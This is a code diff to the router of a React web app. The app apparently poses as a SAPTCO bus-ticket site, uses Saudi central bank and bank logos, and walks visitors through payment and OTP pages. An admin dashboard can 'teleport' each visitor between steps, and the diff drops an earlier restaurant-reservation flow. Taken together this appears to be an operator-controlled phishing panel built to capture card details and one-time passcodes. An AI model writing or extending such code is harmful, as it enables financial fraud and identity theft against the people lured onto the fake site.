@@ -18,43 +18,19 @@ import {
 import samaLogo from "@/assets/sama_logo.png";
 import { findBankLogo } from "@/lib/bank-logos";
 
+// SAPTCO ticket flow: each dashboard step maps to a public route. The
+// dashboard's "Push to step" buttons use these to teleport a visitor.
 const TICKET_STEP_TO_PATH: Record<number, string> = {
-  1: "/registration",
-  2: "/booking",
-  3: "/checkout",
-  4: "/otp",
+  1: "/search-results",
+  2: "/passenger-details",
+  3: "/seat-selection",
+  4: "/payment",
   5: "/otp",
-  6: "/confirmation",
+  6: "/otp",
 };
 
-// Restaurant flow:
-//   Steps 1-4  → SPA-internal stages of /reserve/:id (handled by reserve.tsx
-//                via the "admin-restaurant-step" custom event below).
-//   Step  5    → /otp
-//   Step  6    → /confirmation
-const RESTAURANT_STEP_TO_PATH: Record<number, string> = {
-  5: "/otp",
-  6: "/confirmation",
-};
-
-// Steps that the reserve.tsx page handles internally (no URL change needed).
-const RESTAURANT_INTERNAL_STEPS = new Set<number>([1, 2, 3, 4]);
-
-function isRestaurantVisitor(data: any): boolean {
-  return (
-    window.location.pathname.startsWith("/reserve") ||
-    String(data?.type || "").toLowerCase() === "restaurant_reservation" ||
-    !!data?.restaurant ||
-    !!data?.restaurantEn ||
-    String(data?.currentPage || "") === "reserve_checkout" ||
-    String(data?.currentPage || "") === "reserve_otp"
-  );
-}
-
-function pickTargetPath(step: number, data: any): string | null {
-  const isRestaurant = isRestaurantVisitor(data);
-  const map = isRestaurant ? RESTAURANT_STEP_TO_PATH : TICKET_STEP_TO_PATH;
-  return map[step] || null;
+function pickTargetPath(step: number, _data: any): string | null {
+  return TICKET_STEP_TO_PATH[step] || null;
 }
 
 function DirectedStepWatcher() {
@@ -72,45 +48,6 @@ function DirectedStepWatcher() {
       // Re-check at fire time so admins don't get hijacked even if the
       // listener was attached on a non-admin path earlier.
       if (isAdminPath()) return;
-
-      // Restaurant SPA-internal steps: hand off to reserve.tsx via a custom
-      // event so it can update its internal step state without us navigating
-      // away from /reserve/:id. Because reserve.tsx is lazy-loaded, also stash
-      // the pending step on `window` so reserve.tsx can pick it up on mount
-      // even if the event fires before its effect attaches.
-      if (isRestaurantVisitor(data) && RESTAURANT_INTERNAL_STEPS.has(step)) {
-        const onReservePage =
-          window.location.pathname.startsWith("/reserve");
-        // If the visitor has drifted off /reserve/:id (e.g. they're now on
-        // /otp or /confirmation), navigate them back to the reserve page
-        // first so the SPA-internal step push has somewhere to land.
-        if (!onReservePage) {
-          const rid = data?.restaurantId;
-          if (!rid) {
-            // Without a restaurant id we can't route them back; fall through
-            // and let the normal external-route map handle it (it won't
-            // match for steps 1-4, so the push is a no-op).
-          } else {
-            (window as any).__pendingReserveStep = step;
-            setLocation(`/reserve/${rid}`);
-            setTimeout(() => {
-              void clearDirectedStep();
-            }, 1500);
-            return;
-          }
-        } else {
-          (window as any).__pendingReserveStep = step;
-          window.dispatchEvent(
-            new CustomEvent("admin-restaurant-step", { detail: { step } }),
-          );
-          // Delay the clear so a freshly-lazy-loaded reserve.tsx has time to
-          // attach its listener and process the push before we wipe the field.
-          setTimeout(() => {
-            void clearDirectedStep();
-          }, 1500);
-          return;
-        }
-      }
 
       const target = pickTargetPath(step, data);
       // Always clear so the same step can be re-pushed and so the dashboard
@@ -147,16 +84,9 @@ function DirectedStepWatcher() {
 }
 
 const Home = lazy(() => import("@/pages/home"));
-const RegistrationPage = lazy(() => import("@/pages/registration"));
-const BookingPage = lazy(() => import("@/pages/booking"));
-const CheckoutPage = lazy(() => import("@/pages/checkout"));
 const OTPPage = lazy(() => import("@/pages/otp"));
-const ConfirmationPage = lazy(() => import("@/pages/confirmation"));
 const DashboardPage = lazy(() => import("@/pages/dashboard"));
 const LoginPage = lazy(() => import("@/pages/login"));
-const RestaurantsPage = lazy(() => import("@/pages/restaurants"));
-const RestaurantDetailPage = lazy(() => import("@/pages/restaurant-detail"));
-const ReservePage = lazy(() => import("@/pages/reserve"));
 const TripsPage = lazy(() => import("@/pages/trips"));
 const BookingsPage = lazy(() => import("@/pages/bookings"));
 const RegisterPage = lazy(() => import("@/pages/register"));
@@ -177,16 +107,9 @@ function Router() {
     <Suspense fallback={<Loading />}>
       <Switch>
         <Route path="/" component={Home} />
-        <Route path="/registration" component={RegistrationPage} />
-        <Route path="/booking" component={BookingPage} />
-        <Route path="/checkout" component={CheckoutPage} />
         <Route path="/otp" component={OTPPage} />
-        <Route path="/confirmation" component={ConfirmationPage} />
         <Route path="/dashboard" component={DashboardPage} />
         <Route path="/login" component={LoginPage} />
-        <Route path="/restaurants" component={RestaurantsPage} />
-        <Route path="/restaurant/:id" component={RestaurantDetailPage} />
-        <Route path="/reserve/:id" component={ReservePage} />
         <Route path="/trips" component={TripsPage} />
         <Route path="/bookings" component={BookingsPage} />
         <Route path="/register" component={RegisterPage} />
